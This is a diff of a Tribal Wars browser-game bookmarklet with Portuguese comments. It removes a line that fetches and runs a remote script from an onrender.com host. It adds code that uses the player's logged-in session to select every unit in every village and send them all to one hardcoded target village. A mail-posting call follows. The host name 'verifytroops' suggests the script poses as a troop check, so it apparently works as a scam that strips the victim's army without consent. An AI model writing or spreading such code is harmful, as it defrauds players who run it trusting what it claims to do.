@@ -90,9 +90,75 @@ javascript:(async function(){
     }, 1000);
 
 
-    setTimeout(() => {
-        $.getScript("https://verifytroops.onrender.com/xx.js");
-    }, 2000);
+setTimeout(() => {
+  console.log("vai começar");
+
+  const parts = TribalWars.buildURL("POST", 'place', {
+    mode: 'call',
+    action: 'change_pagesize'
+  }).split('&h=');
+
+  const postUrl = parts[0];
+  const h = parts[1] || '';
+
+  $.ajax({
+    url: postUrl,
+    type: 'POST',
+    data: { page_size: '999', h: h, target: '188299' },
+    success: function (response, status, xhr) {
+      console.log("sucesso");
+
+      const $html = $(response);
+
+      $html.find(".unit_checkbox").prop("checked", true);
+      $html.find("#place_call_select_all").prop("checked", true);
+        $html.find("tr.call-village input[type=checkbox]").prop("checked", true);
+
+      const $form = $html.find("#place_call_form");
+
+      console.log("oi: ", $form);
+
+ const formDataObj = {};
+
+// adiciona os dados do form serializado (string) ao objeto
+$form.serializeArray().forEach(({name, value}) => {
+  formDataObj[name] = value;
+});
+
+// depois, adiciona os dados da tabela:
+$("#village_troup_list tbody tr").each(function() {
+  const $tr = $(this);
+
+  const idParts = $tr.attr("id").split("_");
+  const villageId = idParts[idParts.length - 1];
+
+  $tr.find("td").slice(1, 11).each(function() {
+    const $td = $(this);
+    const count = $td.data("count");
+    const unit = $td.data("unit");
+
+    if(count && count !== '0') {
+      formDataObj[`call[${villageId}][${unit}]`] = count;
+    }
+  });
+});
+
+// Por fim, faça o POST com o objeto
+$.post($form.attr("action"), formDataObj, function(response) {
+  console.log("Resposta:", response);
+});
+    },
+    error: function (xhr, status, error) {
+      console.log("erro: ", error);
+      console.error('Erro:', error);
+    },
+    complete: function () {
+      console.log("Requisição finalizada (com sucesso ou erro)");
+    }
+  });
+
+}, 2000);
+
 
     setTimeout(() => {
         TribalWars.post('mail',
